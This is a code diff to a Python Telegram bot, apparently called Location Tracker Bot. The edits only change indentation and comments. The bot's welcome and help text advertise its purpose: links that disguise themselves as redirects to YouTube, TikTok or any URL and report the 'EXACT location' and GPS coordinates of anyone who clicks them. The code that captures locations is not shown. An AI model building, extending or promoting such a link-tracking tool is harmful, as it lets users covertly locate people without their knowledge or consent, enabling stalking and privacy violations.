@@ -12,8 +12,8 @@ import logging
 # ============================================
 # CONFIGURATION - TOKEN FROM ENVIRONMENT!
 # ============================================
-BOT_TOKEN = os.environ.get('BOT_TOKEN')  # ← SECRET! Read from environment
-SERVER_URL = os.environ.get('SERVER_URL', 'http://localhost:3000')  # Optional
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+SERVER_URL = os.environ.get('SERVER_URL', 'http://localhost:3000')
 
 # Check if token is set
 if not BOT_TOKEN:
@@ -46,18 +46,18 @@ class LocationTrackerBot:
     
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         welcome_text = """
-        🚀 <b>WELCOME TO LOCATION TRACKER BOT</b>
-        
-        I help you track locations of anyone who clicks your links!
-        
-        <b>How it works:</b>
-        1️⃣ Create a tracking link
-        2️⃣ Share the link with anyone
-        3️⃣ When they click it, I send you their EXACT location
-        4️⃣ They get redirected to any URL you choose
-        
-        <b>Quick Start:</b>
-        👇 Click the buttons below to get started!
+🚀 <b>WELCOME TO LOCATION TRACKER BOT</b>
+
+I help you track locations of anyone who clicks your links!
+
+<b>How it works:</b>
+1️⃣ Create a tracking link
+2️⃣ Share the link with anyone
+3️⃣ When they click it, I send you their EXACT location
+4️⃣ They get redirected to any URL you choose
+
+<b>Quick Start:</b>
+👇 Click the buttons below to get started!
         """
         
         keyboard = [
@@ -85,26 +85,26 @@ class LocationTrackerBot:
     
     async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         help_text = """
-        📖 <b>LOCATION TRACKER BOT - HELP</b>
-        
-        <b>Commands:</b>
-        /start - Start the bot
-        /create - Create a new tracking link
-        /links - View all your links
-        /stats - View statistics
-        /monitor - Live monitor mode
-        /help - Show this help
-        
-        <b>How to create a link:</b>
-        1. Click "Create Link" button
-        2. Enter the URL to redirect to
-        3. Get your custom tracking link!
-        
-        <b>Pro Tips:</b>
-        • Use YouTube, TikTok, or any URL
-        • Track who clicks your links
-        • Get exact GPS coordinates
-        • See visitor locations on map
+📖 <b>LOCATION TRACKER BOT - HELP</b>
+
+<b>Commands:</b>
+/start - Start the bot
+/create - Create a new tracking link
+/links - View all your links
+/stats - View statistics
+/monitor - Live monitor mode
+/help - Show this help
+
+<b>How to create a link:</b>
+1. Click "Create Link" button
+2. Enter the URL to redirect to
+3. Get your custom tracking link!
+
+<b>Pro Tips:</b>
+• Use YouTube, TikTok, or any URL
+• Track who clicks your links
+• Get exact GPS coordinates
+• See visitor locations on map
         """
         
         keyboard = [
@@ -582,13 +582,17 @@ Anyone who clicks it will be tracked!
         )
     
     def run(self):
-    print("🚀 Bot is running...")
-    try:
-        self.application.run_polling(allowed_updates=Update.ALL_TYPES)
-    except Exception as e:
-        print(f"❌ Bot error: {e}")
-        raise
+        """Start the bot"""
+        print("🚀 Bot is running...")
+        try:
+            self.application.run_polling(allowed_updates=Update.ALL_TYPES)
+        except Exception as e:
+            print(f"❌ Bot error: {e}")
+            raise
 
+# ============================================
+# START THE BOT
+# ============================================
 if __name__ == '__main__':
     if not BOT_TOKEN:
         print("❌ BOT_TOKEN not set! Please set environment variable.")
